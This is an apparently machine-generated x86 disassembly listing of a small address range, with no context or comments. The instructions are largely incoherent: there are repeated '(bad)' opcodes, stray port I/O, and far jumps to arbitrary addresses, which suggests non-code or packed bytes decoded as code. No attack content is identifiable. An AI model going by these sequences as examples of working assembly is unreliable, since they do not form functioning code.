  41be87:	sbb    dl,bl
  41be89:	inc    esi
  41be8a:	jns    0x41beed
  41be8c:	dec    ebp
  41be8d:	adc    dh,BYTE PTR [edx-0x4a]
  41be90:	push   edx
  41be91:	in     al,0xcd
  41be93:	xchg   DWORD PTR [ecx],esi
  41be95:	cmc    
  41be96:	add    al,0xea
  41be98:	loope  0x41be55
  41be9a:	push   eax
  41be9b:	lods   al,BYTE PTR ds:[esi]
  41be9c:	ret    
  41be9d:	jno    0x41be63
  41be9f:	xchg   esp,eax
  41bea0:	jl     0x41bed9
  41bea2:	pushf  
  41bea3:	push   esi
  41bea4:	in     al,0xa
  41bea6:	shl    BYTE PTR [ebp+0x34],0xca
  41beaa:	or     al,0x59
  41beac:	inc    esp
  41bead:	icebp  
  41beae:	sti    
  41beaf:	fs hlt 
  41beb1:	clc    
  41beb2:	adc    edi,esi
  41beb4:	ret    0x5ea2
  41beb7:	(bad)  
  41beb8:	cmc    
  41beb9:	pop    es
  41beba:	sbb    esp,DWORD PTR [ebx]
  41bebc:	mov    dl,0xef
  41bebe:	cdq    
  41bebf:	retf   0xdfc
  41bec2:	addr16 push 0x83fc01ef
  41bec8:	fbstp  TBYTE PTR es:[ebp+0x30]
  41becc:	xor    cl,BYTE PTR es:0x4021e731
  41bed3:	sahf   
  41bed4:	inc    esp
  41bed5:	jge    0x41bf39
  41bed7:	mov    cl,BYTE PTR [eax]
  41bed9:	(bad)  
  41beda:	mov    bh,0x9c
  41bedc:	cdq    
  41bedd:	dec    edx
  41bede:	or     edx,esp
  41bee0:	add    eax,0xaa23d63a
  41bee5:	das    
  41bee6:	or     eax,0x1f0e4a4
  41beeb:	sbb    DWORD PTR [esi-0x76],0x80152cb3
  41bef2:	imul   edx,ecx,0xffffff94
  41bef5:	mov    ch,0x4
  41bef7:	stos   DWORD PTR es:[edi],eax
  41bef8:	sbb    BYTE PTR [edi-0x9efbeb2],cl
  41befe:	(bad)  
  41beff:	sbb    DWORD PTR [esi-0x46],eax
  41bf02:	call   0x72522d4f
  41bf07:	das    
  41bf08:	inc    edi
  41bf09:	retf   0xcfac
  41bf0c:	adc    BYTE PTR [eax+ebx*2-0x3a],dl
  41bf10:	xchg   BYTE PTR [ebp-0x6b80c793],ah
  41bf16:	test   al,0xe
  41bf18:	jns    0x41bf5a
  41bf1a:	pop    ebp
  41bf1b:	add    DWORD PTR [ecx+0x6d040c35],ebx
  41bf21:	out    dx,al
  41bf22:	sbb    eax,0xf8daebf9
  41bf27:	xor    ebx,esp
  41bf29:	ficom  DWORD PTR [edx+0x735d8925]
  41bf2f:	inc    eax
  41bf30:	push   es
  41bf31:	xchg   ecx,eax
  41bf32:	xchg   edx,eax
  41bf33:	enter  0x66d8,0x8c
  41bf37:	test   esp,0x97206d15
  41bf3d:	push   ds
  41bf3e:	inc    edx
  41bf3f:	in     al,0x66
  41bf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf42:	sub    ebx,DWORD PTR [ecx+0x72]
  41bf45:	xchg   esi,eax
  41bf46:	xor    eax,DWORD PTR [esi+edx*1]
  41bf49:	inc    esi
  41bf4a:	aas    
  41bf4b:	mov    ah,0x30
  41bf4d:	clc    
  41bf4e:	push   esp
  41bf4f:	push   0x8ce0038b
  41bf54:	das    
  41bf55:	inc    eax
  41bf56:	add    BYTE PTR [ecx],dl
  41bf58:	push   ecx
  41bf59:	ja     0x41bf75
  41bf5b:	neg    BYTE PTR [ebp+0x7a]
  41bf5e:	and    DWORD PTR [edi+0x19],esi
  41bf61:	pusha  
  41bf62:	xchg   edx,eax
  41bf63:	ins    DWORD PTR es:[edi],dx
  41bf64:	jecxz  0x41bf78
  41bf66:	mov    DWORD PTR [ebp-0x29],ecx
  41bf69:	mov    ah,0xbb
  41bf6b:	fld    DWORD PTR [edx+0xd]
  41bf6e:	or     eax,0xa07e6fbc
  41bf73:	pop    ebx
  41bf74:	aad    0x3e
  41bf76:	and    eax,0x27828c
  41bf7b:	mov    bl,0x15
  41bf7d:	test   eax,0xbc3c547b
  41bf82:	jl     0x41bf83
  41bf84:	outs   dx,BYTE PTR ds:[esi]
  41bf85:	and    DWORD PTR ds:0x44dc066f,0x370190eb
  41bf8f:	push   eax
  41bf90:	dec    edx
  41bf91:	pushf  
  41bf92:	jmp    0x16a9:0xda896591
  41bf99:	adc    BYTE PTR [edi-0x80],bl
  41bf9c:	daa    
  41bf9d:	adc    eax,0x5d2150f4
  41bfa2:	sub    eax,0x97edbe7e
  41bfa7:	mov    bh,0x4
  41bfa9:	mov    ch,0xc1
  41bfab:	cmp    BYTE PTR [edx-0x2e],ah
  41bfae:	pop    ebx
  41bfaf:	sbb    cl,BYTE PTR cs:[edi+0x2182d7d0]
  41bfb6:	adc    ecx,0xffffff89
  41bfb9:	lds    esp,FWORD PTR [eax-0x64]
  41bfbc:	mov    DWORD PTR [edx+0x31],ecx
  41bfbf:	jmp    0x8af61d78
  41bfc4:	nop
  41bfc5:	dec    edx
  41bfc6:	mov    dl,bh
  41bfc8:	mov    dl,0xdd
  41bfca:	cmp    eax,0x9bedd424
  41bfcf:	jbe    0x41bfe4
  41bfd1:	iret   
  41bfd2:	shl    bl,0xb5
  41bfd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd6:	cmp    BYTE PTR [esi+0x9],ch
  41bfd9:	icebp  
  41bfda:	std    
  41bfdb:	int    0xaf
  41bfdd:	std    
  41bfde:	mov    ah,0x8e
  41bfe0:	pusha  
  41bfe1:	je     0x41c02d
  41bfe3:	or     bh,BYTE PTR [eax-0x72]
  41bfe6:	sbb    dl,ah
  41bfe8:	jmp    0xb6d7065c
  41bfed:	lds    esp,FWORD PTR [edi+esi*4+0x28]
  41bff1:	adc    al,0x27
  41bff3:	sbb    al,0xca
  41bff5:	ret    
  41bff6:	inc    esi
  41bff7:	out    dx,eax
  41bff8:	inc    ecx
  41bff9:	sbb    edi,edi
  41bffb:	mov    al,ds:0x8fc85619
  41c000:	mov    BYTE PTR [eax+0x7988cd51],bl
  41c006:	fnsave [ebp-0x77d2800c]
  41c00c:	cmp    DWORD PTR [edx],ecx
  41c00e:	xchg   ebx,esi
  41c010:	sbb    DWORD PTR [eax],esp
  41c012:	fwait
  41c013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c014:	pusha  
  41c015:	jb     0x41bfea
  41c017:	addr16 mov dl,0xd9
  41c01a:	je     0x41bff1
  41c01c:	pop    ebp
  41c01d:	ins    DWORD PTR es:[edi],dx
  41c01e:	stc    
  41c01f:	jno    0x41c069
  41c021:	push   ebp
  41c022:	cmp    ebp,DWORD PTR [edx]
  41c024:	stc    
  41c025:	xchg   esp,eax
  41c026:	(bad)  
  41c027:	iret   
  41c028:	pushf  
  41c029:	jmp    0x33fd:0xc2b08a3f
  41c030:	repz push cs
  41c032:	repnz xchg edx,eax
  41c034:	cmp    al,0xa0
  41c036:	and    BYTE PTR [edx+0x38],dl
  41c039:	sbb    eax,DWORD PTR [edx-0x2b]
  41c03c:	ret    
  41c03d:	jecxz  0x41c02a
  41c03f:	mov    eax,ds:0x845f31e9
  41c044:	adc    al,0x96
  41c046:	dec    edx
  41c047:	out    dx,al
  41c048:	lods   eax,DWORD PTR ds:[esi]
  41c049:	dec    ebx
  41c04a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c04b:	fdiv   QWORD PTR [edx+0x628cfbf1]
  41c051:	lds    eax,FWORD PTR [eax+eax*2-0x77]
  41c055:	adc    eax,esi
  41c057:	sub    DWORD PTR cs:[ecx+0xf],esp
  41c05b:	sbb    al,0x0
  41c05d:	cmp    DWORD PTR [esi-0x60f4df9b],ecx
  41c063:	lods   al,BYTE PTR ds:[esi]
  41c064:	dec    ebp
  41c065:	out    dx,eax
  41c066:	pop    eax
  41c067:	xchg   esi,ebp
  41c069:	test   DWORD PTR [esi],0xb0ba68dd
  41c06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c070:	aaa    
  41c071:	rcl    BYTE PTR [ebx-0x3e],cl
  41c074:	ror    BYTE PTR [ebx+edx*2+0x6b88b97c],1
  41c07b:	sti    
  41c07c:	cmp    al,0x3c
  41c07e:	into   
  41c07f:	jb     0x41c07d
  41c081:	scas   al,BYTE PTR es:[edi]
  41c082:	test   BYTE PTR [edi+0x2b],0x7b
  41c086:	fs in  eax,0xaa
  41c089:	dec    ebp
  41c08a:	jne    0x41c02a
  41c08c:	pop    esi
  41c08d:	dec    eax
  41c08e:	mov    edi,0x7239e2e0
  41c093:	mov    esi,0xf60436d3
  41c098:	and    DWORD PTR [esi+eiz*1],esi
  41c09b:	fisubr WORD PTR [esi-0xa5a1485]
  41c0a1:	xor    al,0xb3
  41c0a3:	retf   0xb076
  41c0a6:	stos   BYTE PTR es:[edi],al
  41c0a7:	mov    ds:0xdc06977,eax
  41c0ac:	lods   eax,DWORD PTR ds:[esi]
  41c0ad:	repnz ror BYTE PTR [edx+0x4],0xf0
  41c0b2:	cld    
  41c0b3:	push   ebx
  41c0b4:	ins    BYTE PTR es:[edi],dx
  41c0b5:	retf   
  41c0b6:	je     0x41c041
  41c0b8:	data16 jae 0x41c081
  41c0bb:	(bad)
  41c0be:	jno    0x41c0c8
  41c0c0:	pop    ds
  41c0c1:	shl    DWORD PTR [ebx+0x1a],cl
  41c0c4:	jmp    0x41c0aa
  41c0c6:	mov    bl,0xac
  41c0c8:	jae    0x41c050
  41c0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0cb:	mov    ebx,0xbc30ee52
  41c0d0:	ja     0x41c141
  41c0d2:	mov    al,0xdd
  41c0d4:	imul   ecx,DWORD PTR [ecx-0x52],0x9b377e2f
  41c0db:	mov    ah,0xa9
  41c0dd:	popf   
  41c0de:	(bad)  
  41c0e0:	xor    ah,BYTE PTR [ebp+0x5559b7ce]
  41c0e6:	in     eax,dx
  41c0e7:	lods   eax,DWORD PTR ds:[esi]
  41c0e8:	jb     0x41c128
  41c0ea:	xchg   esp,eax
  41c0eb:	pusha  
  41c0ec:	cwde   
  41c0ed:	add    BYTE PTR [ebx-0x38e6452],dl
  41c0f3:	mov    BYTE PTR [ebx+ecx*4-0x34],bl
  41c0f7:	fidivr DWORD PTR [ecx-0x33a65f3b]
  41c0fd:	or     ebx,edx
  41c0ff:	int    0x54
  41c101:	or     BYTE PTR [ecx+0x38],ah
  41c104:	aam    0xc1
  41c106:	add    eax,DWORD PTR [ebx-0x2701a252]
  41c10c:	gs out 0x58,al
  41c10f:	fld    st(3)
  41c111:	or     eax,esi
  41c113:	aaa    
  41c114:	imul   eax,esp,0x75
  41c117:	ins    DWORD PTR es:[edi],dx
  41c118:	adc    al,0xa8
  41c11a:	and    al,0x3b
  41c11c:	pop    esi
  41c11d:	fidivr WORD PTR [ebx+0x73da12e3]
  41c123:	adc    al,0x48
  41c125:	pop    es
  41c126:	pop    ss
  41c127:	dec    edx
  41c128:	ja     0x41c15a
  41c12a:	fisttp QWORD PTR [esi+0x151c8303]
  41c130:	stos   BYTE PTR es:[edi],al
  41c131:	xchg   ebp,eax
  41c132:	jae    0x41c18b
  41c134:	mov    esp,0xa3a6183b
  41c139:	sub    dl,dl
  41c13b:	fmul   st,st(0)
  41c13d:	test   eax,0xbb26081e
  41c142:	dec    edi
  41c143:	mov    ecx,0x2b2ae439
  41c148:	mov    cl,0xa5
  41c14a:	push   esp
  41c14b:	in     al,dx
  41c14c:	and    edi,DWORD PTR [eax+0x72777936]
  41c152:	cmp    BYTE PTR [edi+0x15],dl
  41c155:	jmp    0xcfa3658b
  41c15a:	jp     0x41c141
  41c15c:	xchg   BYTE PTR [edi-0x49c4e7dc],al
  41c162:	xlat   BYTE PTR ds:[ebx]
  41c163:	push   edx
  41c164:	jl     0x41c1d8
  41c166:	and    eax,esp
  41c168:	mov    eax,DWORD PTR [ecx]
  41c16a:	mov    eax,0x7a09900a
  41c16f:	dec    edi
  41c170:	cmp    al,0x58
  41c172:	ret    
  41c173:	(bad)  
  41c175:	std    
  41c176:	xchg   ebx,eax
  41c177:	sub    ebx,esp
  41c179:	clc    
  41c17a:	mov    al,0xf8
  41c17c:	add    eax,0xf907db1c
  41c181:	leave  
  41c182:	(bad)  
  41c183:	idiv   DWORD PTR [eax]
  41c185:	xchg   ebp,eax
  41c186:	jo     0x41c109
  41c188:	(bad)  
  41c189:	addr16 pop ebx
  41c18b:	lods   eax,DWORD PTR ds:[esi]
  41c18c:	push   cs
  41c18d:	clc    
  41c18e:	out    dx,al
  41c18f:	inc    ebx
  41c190:	in     al,0x34
  41c192:	xchg   edi,eax
  41c193:	and    BYTE PTR [eax-0x51e15deb],0x32
  41c19a:	pusha  
  41c19b:	push   ebp
  41c19c:	push   cs
  41c19d:	lods   al,BYTE PTR ds:[esi]
  41c19e:	js     0x41c18d
  41c1a0:	cld    
  41c1a1:	pop    ecx
  41c1a2:	in     eax,dx
  41c1a3:	and    ecx,edx
  41c1a5:	sahf   
  41c1a6:	jmp    FWORD PTR [ebx+0x1c]
  41c1a9:	sub    esp,0x1a9a5db3
  41c1af:	xchg   BYTE PTR [ebp+edx*8-0x6b25757c],dh
  41c1b6:	mov    dl,0x58
  41c1b8:	xor    dl,bl
  41c1ba:	jmp    0x49da:0x648e5bae
  41c1c1:	stos   DWORD PTR es:[edi],eax
  41c1c2:	(bad)  
  41c1c3:	fisttp WORD PTR [eax-0x1d8d3e7]
  41c1c9:	xchg   esp,eax
  41c1ca:	xor    eax,0xec2c4e0a
  41c1cf:	pop    esi
  41c1d0:	cmc    
  41c1d1:	mov    esi,0x1fac347a
  41c1d6:	mov    cl,0xde
  41c1d8:	mov    edx,0x889bc888
  41c1dd:	mov    ds:0xec01a991,al
  41c1e2:	lds    ecx,FWORD PTR [esi+0x4a27bdf9]
  41c1e8:	push   edi
  41c1e9:	rol    ebx,cl
  41c1eb:	in     eax,0xb5
  41c1ed:	pusha  
  41c1ee:	mul    ecx
  41c1f0:	stos   DWORD PTR es:[edi],eax
  41c1f1:	dec    ecx
  41c1f2:	or     esi,esi
  41c1f4:	mov    ah,BYTE PTR [ecx]
  41c1f6:	pop    esi
  41c1f7:	adc    al,0x46
  41c1f9:	and    ah,BYTE PTR [edx-0x49]
  41c1fc:	stos   BYTE PTR es:[edi],al
  41c1fd:	dec    edi
  41c1fe:	xchg   ch,bh
  41c200:	loop   0x41c1e6
  41c202:	lods   al,BYTE PTR ds:[esi]
  41c203:	retf   0x5839
  41c206:	push   esi
  41c207:	inc    edx
  41c208:	and    ah,ah
  41c20a:	add    esp,ebp
  41c20c:	sahf   
  41c20d:	push   ds
  41c20e:	fld    QWORD PTR [edi+0x4c8c342a]
  41c214:	xchg   ebx,eax
  41c215:	repnz aad 0x64
  41c218:	mov    eax,ds:0x975a2fe0
  41c21d:	and    eax,0xd8673f52
  41c222:	xchg   edx,eax
  41c223:	jg     0x41c23a
  41c225:	push   edx
  41c226:	jmp    0x5605:0xcf47ae69
  41c22d:	sub    eax,0x2c74aa54
  41c232:	aas    
  41c233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c234:	sar    dl,0xa3
  41c237:	test   al,0xb1
  41c239:	stos   BYTE PTR es:[edi],al
  41c23a:	jl     0x41c287
  41c23c:	add    dl,0x37
  41c23f:	cwde   
  41c240:	imul   ebx,DWORD PTR [ebx-0x70cc894f],0xbeec60bc
  41c24a:	pop    es
  41c24b:	xchg   edx,eax
  41c24c:	mov    bh,0x75
  41c24e:	mov    ch,0x15
  41c250:	daa    
  41c251:	pop    edi
  41c252:	mov    bh,0x30
  41c254:	push   eax
  41c255:	jae    0x41c2ad
  41c257:	adc    eax,0xb302ad26
  41c25c:	mov    BYTE PTR [edi+0x239304a],bh
  41c262:	push   eax
  41c263:	je     0x41c1ed
  41c265:	out    dx,al
  41c266:	test   BYTE PTR [eax-0x29e5460],ch
  41c26c:	xchg   ebp,eax
  41c26d:	aad    0x60
  41c26f:	aad    0x3e
  41c271:	sbb    BYTE PTR [edi],bl
  41c273:	cmp    edx,DWORD PTR [eax]
  41c275:	mov    ds:0xc7f83a4b,eax
  41c27a:	popf   
  41c27b:	cmp    BYTE PTR [edi],dh
  41c27d:	out    0x89,al
  41c27f:	pop    esp
  41c280:	stos   BYTE PTR es:[edi],al
  41c281:	into   
  41c282:	cmp    DWORD PTR [ebp+0x18b5f0a8],eax
  41c288:	in     al,0xfc
  41c28a:	mov    ah,0xc5
  41c28c:	cmp    al,0x8a
  41c28e:	cdq    
  41c28f:	cdq    
  41c290:	xchg   esp,eax
  41c291:	sub    BYTE PTR [esi+0x20],0x7
  41c295:	mov    bl,BYTE PTR [ebx]
  41c297:	jle    0x41c279
  41c299:	ret    0x49a2
  41c29c:	dec    edx
  41c29d:	pop    eax
  41c29e:	pop    esp
  41c29f:	dec    DWORD PTR [edx]
  41c2a1:	in     al,dx
  41c2a2:	stos   BYTE PTR es:[edi],al
  41c2a3:	enter  0x43c0,0x99
  41c2a7:	(bad)  [esi-0x289c7231]
  41c2ad:	popf   
  41c2ae:	push   0xa7919d0e
  41c2b3:	mov    ecx,edi
  41c2b5:	push   esp
  41c2b6:	(bad)  
  41c2b7:	sahf   
  41c2b8:	call   DWORD PTR [edi+0x3a306293]
  41c2be:	inc    edx
  41c2bf:	fstp   TBYTE PTR [edi-0x80]
  41c2c2:	ss ins DWORD PTR es:[edi],dx
  41c2c4:	je     0x41c33f
  41c2c6:	pop    ebp
  41c2c7:	xlat   BYTE PTR ds:[ebx]
  41c2c8:	jae    0x41c276
  41c2ca:	int    0xf
  41c2cc:	data16 daa 
  41c2ce:	sub    eax,0x271812d0
  41c2d3:	inc    esp
  41c2d4:	leave  
  41c2d5:	into   
  41c2d6:	ds push esi
  41c2d8:	leave  
  41c2d9:	into   
  41c2da:	fsubr  QWORD PTR [ebx]
  41c2dc:	sub    DWORD PTR [ebx+0x2164cae1],eax
  41c2e2:	test   BYTE PTR [esp+esi*1-0x2de0c4e5],dh
  41c2e9:	cmp    eax,DWORD PTR [ebx-0x17236cf2]
  41c2ef:	pop    ds
  41c2f0:	jmp    0x41c2fc
  41c2f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2f3:	ins    BYTE PTR es:[edi],dx
  41c2f4:	mov    bl,0xfe
  41c2f6:	(bad)  
  41c2f7:	test   DWORD PTR [eax+edi*4+0x3f],0x5a5f3d4
  41c2ff:	loopne 0x41c28c
  41c301:	loope  0x41c375
  41c303:	outs   dx,DWORD PTR ds:[esi]
  41c304:	pushf  
  41c305:	pop    ds
  41c306:	and    al,BYTE PTR [esi+0x1a]
  41c309:	ret    0x7c30
  41c30c:	and    eax,0xcb29f98e
  41c311:	add    DWORD PTR [ebx+ebp*4+0x2e2d11f4],edx
  41c318:	jp     0x41c364
  41c31a:	mul    bh
  41c31c:	loop   0x41c351
  41c31e:	push   esp
  41c31f:	sub    DWORD PTR [edi],ecx
  41c321:	cs sub al,0xcd
  41c324:	je     0x41c387
  41c326:	inc    esp
  41c327:	hlt    
  41c328:	inc    esp
  41c329:	ja     0x41c380
  41c32b:	pop    ebx
  41c32c:	mov    eax,0xac0f1994
  41c331:	jnp    0x41c399
  41c333:	(bad)  
  41c334:	push   ss
  41c335:	sbb    BYTE PTR [eax-0x17],cl
  41c338:	jl     0x41c371
  41c33a:	leave  
  41c33b:	(bad)  
  41c33c:	or     cl,bh
  41c33e:	shr    ecx,0x86
  41c341:	jg     0x41c390
  41c343:	mov    esi,0xeb3580bc
  41c348:	ja     0x41c2e2
  41c34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c34b:	ss mov ecx,0xfef34252
  41c351:	dec    esi
  41c352:	push   ecx
  41c353:	jne    0x41c399
  41c355:	xchg   edx,eax
  41c356:	aad    0xef
  41c358:	in     al,0x9a
  41c35a:	inc    ebp
  41c35b:	mov    dh,0x75
  41c35d:	lahf   
  41c35e:	hlt    
  41c35f:	sbb    BYTE PTR [eax],ah
  41c361:	pop    ebx
  41c362:	cmp    ch,BYTE PTR [esi-0x67cebddd]
  41c368:	or     bh,BYTE PTR [edx-0x74087b2b]
  41c36e:	pusha  
  41c36f:	pop    es
  41c370:	aam    0x89
  41c372:	mov    ecx,0xf82368d5
  41c377:	sbb    DWORD PTR [ecx],ecx
  41c379:	add    ecx,DWORD PTR [esi]
  41c37b:	mov    eax,0xe8b89e9d
  41c380:	in     al,0xf2
  41c382:	jmp    0x70ba03a1
  41c387:	sbb    BYTE PTR [edx+0x5e9f67ae],0xea
  41c38e:	mov    eax,0x7fceb2b5
  41c393:	loope  0x41c36b
  41c395:	scas   eax,DWORD PTR es:[edi]
  41c396:	push   ss
  41c397:	in     al,0x1f
  41c399:	call   0x11bc528e
  41c39e:	push   edi
  41c39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3a0:	stos   DWORD PTR es:[edi],eax
  41c3a1:	mov    BYTE PTR [ebx-0x3b],al
  41c3a4:	inc    ebp
  41c3a5:	data16 jl 0x41c422
  41c3a8:	xchg   esp,eax
  41c3a9:	repnz sbb eax,0x9687091f
  41c3af:	push   esp
  41c3b0:	jb     0x41c34a
  41c3b2:	xchg   BYTE PTR [edx-0x4b492c27],bl
  41c3b8:	push   edx
  41c3b9:	or     al,0x36
  41c3bb:	pop    eax
  41c3bc:	inc    esi
  41c3bd:	and    BYTE PTR [edx+0x0],al
  41c3c0:	jo     0x41c3c1
  41c3c2:	sti    
  41c3c3:	out    dx,eax
  41c3c4:	add    dh,BYTE PTR [eax-0x3bba147c]
  41c3ca:	dec    ebp
  41c3cb:	int    0x88
  41c3cd:	stc    
  41c3ce:	out    0x2f,al
  41c3d0:	and    dh,dh
  41c3d2:	icebp  
  41c3d3:	shr    BYTE PTR [esi+0x79],cl
  41c3d6:	xlat   BYTE PTR ds:[ebx]
  41c3d7:	stc    
  41c3d8:	mov    al,ds:0xe2f70b6f
  41c3dd:	sbb    esi,DWORD PTR [edi]
  41c3df:	outs   dx,DWORD PTR ds:[esi]
  41c3e0:	mov    ebp,0xdb44dcd2
  41c3e5:	in     eax,dx
  41c3e6:	or     bl,BYTE PTR [ebp+0x3]
  41c3e9:	inc    eax
  41c3ea:	dec    edx
  41c3eb:	or     al,0x74
  41c3ed:	fadd   DWORD PTR [ebp+0x702b24f6]
  41c3f3:	pushf  
  41c3f4:	loop   0x41c433
  41c3f6:	mov    ss,edi
  41c3f8:	mov    gs,WORD PTR [esi]
  41c3fa:	adc    BYTE PTR [edx+0x56b69838],ah
  41c400:	push   ds
  41c401:	(bad)  
  41c402:	retf   
  41c403:	push   ebp
  41c404:	fs out dx,eax
  41c406:	iret   
  41c407:	fidiv  DWORD PTR [eax+0x18]
  41c40a:	pop    ebx
  41c40b:	repnz inc ebp
  41c40d:	dec    esp
  41c40e:	adc    esp,esp
  41c410:	jle    0x41c3fb
  41c412:	mov    edx,DWORD PTR [ebx-0x68]
  41c415:	in     eax,dx
  41c416:	inc    esi
  41c417:	inc    ebx
  41c418:	call   0xf1d:0x8e967c42
  41c41f:	lahf   
  41c420:	neg    BYTE PTR [edi+0x7a]
  41c423:	in     eax,dx
  41c424:	(bad)  
  41c425:	js     0x41c457
  41c427:	xor    al,0x21
  41c429:	xchg   edx,eax
  41c42a:	mov    edi,0xcba39b48
  41c42f:	adc    eax,0xf39ec3f6
  41c434:	bound  esi,QWORD PTR [edi]
  41c436:	or     eax,0xad148431
  41c43b:	jnp    0x41c45b
  41c43d:	dec    ebp
  41c43e:	xor    DWORD PTR [ebp-0x3296fe34],ebp
  41c444:	aas    
  41c445:	mov    edi,0xd7f2eb00
  41c44a:	adc    eax,0x5f29da3c
  41c44f:	fsub   DWORD PTR [edx]
  41c451:	pop    ecx
  41c452:	push   0xffffff95
  41c454:	test   eax,0xe50179c3
  41c459:	in     eax,0x6e
  41c45b:	dec    ebx
  41c45c:	xor    cl,BYTE PTR [edi-0x65]
  41c45f:	inc    ebp
  41c460:	into   
  41c461:	sbb    DWORD PTR ds:0xc59ad4e2,esp
  41c467:	es stc 
  41c469:	jmp    0x41c42a
  41c46b:	sar    dl,cl
  41c46d:	inc    esp
  41c46e:	sar    BYTE PTR [edi+0x76],1
  41c471:	lods   al,BYTE PTR ds:[esi]
  41c472:	lahf   
  41c473:	js     0x41c4a7
  41c475:	sbb    ebp,DWORD PTR [ecx-0x81f8afa]
  41c47b:	dec    edi
  41c47c:	inc    eax
  41c47d:	mov    bl,0x81
  41c47f:	mov    bl,0xd
  41c481:	in     eax,0xbb
  41c483:	cmp    eax,0x5c2da7d6
  41c488:	xor    BYTE PTR [eax],cl
  41c48a:	mov    al,ds:0x947d0e8d
  41c48f:	mov    esi,0xc971f18c
  41c494:	in     eax,0x6d
  41c496:	ins    BYTE PTR es:[edi],dx
  41c497:	mov    dl,0xac
  41c499:	ror    BYTE PTR ds:0xa8524913,cl
  41c49f:	es rol BYTE PTR cs:[ebx+esi*2+0x55b00144],0x7a
  41c4a9:	cmp    bl,bl
  41c4ab:	push   esp
  41c4ac:	mov    bl,0xc3
  41c4ae:	dec    eax
  41c4af:	cmp    eax,0xe7e9a334
  41c4b4:	repnz lods eax,DWORD PTR ds:[esi]
  41c4b6:	jbe    0x41c4c5
  41c4b8:	adc    esi,DWORD PTR ds:0xbf329fe2
  41c4be:	mov    BYTE PTR [edi-0x5a7bb8d2],dh
  41c4c4:	jg     0x41c4ef
  41c4c6:	mov    ecx,0x483bca8c
  41c4cb:	outs   dx,DWORD PTR ds:[esi]
  41c4cc:	jne    0x41c4b3
  41c4ce:	aaa    
  41c4cf:	in     al,0x6
  41c4d1:	sbb    DWORD PTR ds:0x9ada962f,edx
  41c4d7:	pop    esp
  41c4d8:	push   eax
  41c4d9:	lock and bh,BYTE PTR [esi-0x342efb96]
  41c4e0:	les    eax,FWORD PTR [ebx+eiz*2-0x25c18833]
  41c4e7:	jb     0x41c50f
  41c4e9:	sbb    edx,esi
  41c4eb:	or     BYTE PTR [esi+0xc828b12],ah
  41c4f1:	pop    ds
  41c4f2:	mov    WORD PTR [ebx+0x5ec17e74],es
  41c4f8:	sar    DWORD PTR [eax],0x20
  41c4fb:	scas   al,BYTE PTR es:[edi]
  41c4fc:	loope  0x41c549
  41c4fe:	fmulp  st(0),st
  41c500:	dec    esp
  41c501:	mov    dl,0xc2
  41c503:	push   esi
  41c504:	xchg   edx,eax
  41c505:	inc    ecx
  41c506:	or     al,0xb7
  41c508:	push   edi
  41c509:	fwait
  41c50a:	jp     0x41c540
  41c50c:	fs (bad) 
  41c50e:	xor    al,0xe1
  41c510:	aas    
  41c511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c512:	jae    0x41c4c4
  41c514:	jbe    0x41c4c6
  41c516:	mov    edx,0x826ba41
  41c51b:	loopne 0x41c538
  41c51d:	sbb    ecx,edx
  41c51f:	xchg   ebx,eax
  41c520:	and    ebx,0xe537fc8e
  41c526:	xchg   ecx,eax
  41c527:	aaa    
  41c528:	or     al,0x5b
  41c52a:	loope  0x41c4f2
  41c52c:	loopne 0x41c540
  41c52e:	or     ecx,DWORD PTR [ebx-0x52f53afd]
  41c534:	or     bl,0xd1
  41c537:	jnp    0x41c502
  41c539:	fimul  WORD PTR [ebp+0x20362a4b]
  41c53f:	pop    ebx
  41c540:	add    DWORD PTR [esi-0x49],ebx
  41c543:	(bad)  
  41c544:	loop   0x41c597
  41c546:	lods   eax,DWORD PTR ds:[esi]
  41c547:	retf   0x3e8
  41c54a:	cmc    
  41c54b:	pop    ebx
  41c54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c54d:	sahf   
  41c54e:	xor    dh,BYTE PTR [eax-0x53]
  41c551:	add    DWORD PTR [ebp-0x79],0xc77c5eba
  41c558:	std    
  41c559:	push   esp
  41c55a:	and    edi,DWORD PTR [esp+eiz*2-0x173fe427]
  41c561:	inc    edx
  41c562:	mov    ah,0xd9
  41c564:	xchg   BYTE PTR [eax],bl
  41c566:	xchg   ecx,eax
  41c567:	repnz xchg esi,eax
  41c569:	ins    DWORD PTR es:[edi],dx
  41c56a:	adc    al,0x46
  41c56c:	sub    al,0x8e
  41c56e:	push   esi
  41c56f:	vpsubb xmm6,xmm5,XMMWORD PTR [ebx]
  41c573:	mov    BYTE PTR [ebx+ebx*1+0x74dbf145],dh
  41c57a:	aaa    
  41c57b:	or     DWORD PTR [ecx+ebp*8],0x5b
  41c57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c580:	xor    al,0x77
  41c582:	loop   0x41c5ac
  41c584:	shl    BYTE PTR [esi],1
  41c586:	(bad)  
  41c587:	mov    eax,ds:0xc771a853
  41c58c:	push   es
  41c58d:	jae    0x41c5d2
  41c58f:	add    DWORD PTR [edi+0x7c],esp
  41c592:	ss pop bx
  41c595:	lahf   
  41c596:	aaa    
  41c597:	mov    eax,ebp
  41c599:	xchg   ebp,eax
  41c59a:	lds    ecx,FWORD PTR [ebp+0x483ac21]
  41c5a0:	jp     0x41c58d
  41c5a2:	pop    eax
  41c5a3:	inc    ecx
  41c5a4:	fbstp  TBYTE PTR [esi]
  41c5a6:	out    dx,eax
  41c5a7:	adc    BYTE PTR [ebx+0x6edd83a0],dh
  41c5ad:	xchg   esp,eax
  41c5ae:	jmp    0x83f74d42
  41c5b3:	imul   eax,DWORD PTR [esi+0xac4b994],0xffffffb6
  41c5ba:	cmp    eax,DWORD PTR [edx+0x23]
  41c5bd:	push   cs
  41c5be:	mov    ds:0xcf6f40c3,eax
  41c5c3:	inc    ebp
  41c5c4:	cs (bad) 
  41c5c6:	and    DWORD PTR [bx+di],esp
  41c5c9:	fs push edi
  41c5cb:	pop    ecx
